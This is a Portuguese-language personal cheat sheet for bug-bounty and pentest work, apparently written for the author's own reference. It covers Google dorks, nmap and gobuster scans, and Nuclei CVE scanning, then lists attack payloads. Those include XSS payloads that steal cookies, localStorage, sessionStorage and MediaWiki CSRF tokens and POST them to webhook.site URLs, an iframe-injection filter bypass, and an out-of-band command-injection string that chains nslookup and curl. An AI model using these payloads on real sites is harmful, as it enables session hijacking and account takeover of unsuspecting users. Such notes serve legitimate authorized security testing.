# Umas paradas que uso de vez em quando e gosto de deixar salvo pra lembrar

---

### Dorks & Descoberta
* **Encontrar Programas de VDP (Vulnerability Disclosure Program):**
    ```
    "Vulnerability Disclosure Program" VDP "site:uk -bugbount -hackerone -intigriti -bugcrowd -yeswehack"
    ```
* **Repositório de Google Dorks:**
    * [Dorks Faisalahmed](https://dorks.faisalahmed.me/)

### Escaneamento de Rede e Subdomínios
* **Nmap - Scan DNS para vazamento de informações:**
    ```bash
    # Verifica o servidor DNS (porta 53/UDP) por possíveis exposições de dados sensíveis.
    nmap -sU -p 53 --script=dns-nsid 10.129.2.48
    ```
* **Nmap - Scan Avançado:**
    ```bash
    # Scan com detecção de versão (-sV), usando decoys (D RND:2), múltiplos tipos de scan e user-agent customizado.
    nmap 10.129.4.84 -sV -D RND:2 -Pn -sS -sU --max-retries=2 --script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36" -p-
    ```
* **Descoberta de Diretórios com Gobuster:**
    ```bash
    # Força bruta de diretórios com headers customizados de Host e Cookie.
    gobuster dir -u https://teste.com -w /usr/share/wordlists/dirb/common.txt  -t 50 -H 'Cookie: ASP.NET_SessionId=whvgzv2plsyzvnglugu2kxyc;' -k -x html,php,js,aspx,bat,txt,zip -b 400 -exclude-lenght 100
    ```

### Extensões úteis para Browser
* `dotgit`
* `Wappalyzer`
* `Shodan`
* `DNSlytics`


## Análise de Vulnerabilidades

Ferramentas para escanear ativamente por falhas de segurança conhecidas.

* **Instalação do ZAP (Zed Attack Proxy):**
    ```bash
    # Uma ótima ferramenta para scan de aplicações web.
    sudo apt install zaproxy
    ```
* **Nuclei - Scan de CVEs em subdomínios:**
    ```bash
    # Encontra subdomínios, verifica quais estão ativos e roda um template específico do Nuclei.
    subfinder -all -d alvo.com -recursive | httpx | nuclei -nmhe -t ./nuclei-templates/http/cves/(CVE)/CVE-2025-0133.yaml
    ```
* **Nuclei - Scan geral de CVEs:**
    ```bash
    nuclei -t cves/ -u [http://alvo.com] -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    ```
* **Nuclei - Scan focado em tecnologia (ex: Moodle):**
    ```bash
    nuclei -u [https://alvo.com]) -tags moodle
    ```


## Payloads & Exploração

Snippets de código para explorar vulnerabilidades como XSS, SSRF, etc.

### Cross-Site Scripting (XSS)

* **Payload XSS Simples para Roubo de Cookies:**
    ```html
    <img src="x" onerror="fetch('[https://webhook.site/085d7083-a25c-41c6-beb6-113d2b58e605](https://webhook.site/085d7083-a25c-41c6-beb6-113d2b58e605)', {method:'POST', body:'<cookie>='+document.cookie})">
    ```
* **Bypass de filtro de iframe com xss onerror**
```
<img src="invalid" onerror="document.body.innerHTML+='<iframe src=https://emupedia.net/emupedia-game-doom1/asmjs/ width=500 height=400></iframe>'">
```
* **Payload XSS Avançado para Exfiltração de Dados:**
    * Este script captura cookies, `localStorage`, `sessionStorage`, tokens específicos de MediaWiki e informações do usuário, enviando tudo para um webhook.
    ```html
    <img src="invalid" onerror="
  var data = {
    cookies: document.cookie,
    localStorage: {},
    sessionStorage: {},
    mediawikiTokens: {},
    userInfo: {}
  };
  
  // Capturar todos os dados do localStorage
  for(var i=0; i<localStorage.length; i++) {
    var key = localStorage.key(i);
    data.localStorage[key] = localStorage.getItem(key);
  }
  
  // Capturar todos os dados do sessionStorage
  for(var i=0; i<sessionStorage.length; i++) {
    var key = sessionStorage.key(i);
    data.sessionStorage[key] = sessionStorage.getItem(key);
  }
  
  // Tenta obter tokens do MediaWiki especificamente
  try {
    if (typeof mw !== 'undefined' && mw.user && mw.user.tokens) {
      data.mediawikiTokens = {
        editToken: mw.user.tokens.get('editToken'),
        csrfToken: mw.user.tokens.get('csrfToken'),
        watchToken: mw.user.tokens.get('watchToken')
      };
    }
  } catch(e) {}
  
  // Informações do usuário
  try {
    if (typeof mw !== 'undefined' && mw.config) {
      data.userInfo = {
        userName: mw.config.get('wgUserName'),
        userId: mw.config.get('wgUserId'),
        pageName: mw.config.get('wgPageName'),
        canonicalNamespace: mw.config.get('wgCanonicalNamespace'),
        revisionId: mw.config.get('wgRevisionId'),
        articleId: mw.config.get('wgArticleId')
      };
    }
  } catch(e) {}
  
  fetch('https://webhook.site/ce0ff999-b412-490d-aa38-f946520e63b0', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
  });
    ">

```
```
### Out-of-Band (OOB)

* **Payload OOB para testar em Headers (Blind SSRF, etc):**
    * Tenta forçar uma resolução DNS e uma requisição HTTP para um domínio externo. Útil para injetar em cabeçalhos como `User-Agent`, `Referer`, `X-Forwarded-For`, etc.
    ```bash
    # :r: é um placeholder para o valor que será injetado
    :r:nslookup -q=cname hitvibmacavit642a1.bxss.me|curl hitvibmacav
    ```

### Server local

```bash
python3 -m http.server 1234
ngrok http 1234

(pra se usar o ngrok precisa do http.server, porém só o http.server já server como server interno, o ngrok o deixa publico)
```
## Ferramentas & Recursos Adicionais

Links para repositórios e ferramentas úteis.

- [SHCheck - Shell/Header Vulnerability Checker](https://github.com/santoru/shcheck)
- [Converter imagem em link pub](https://pngup.com/)

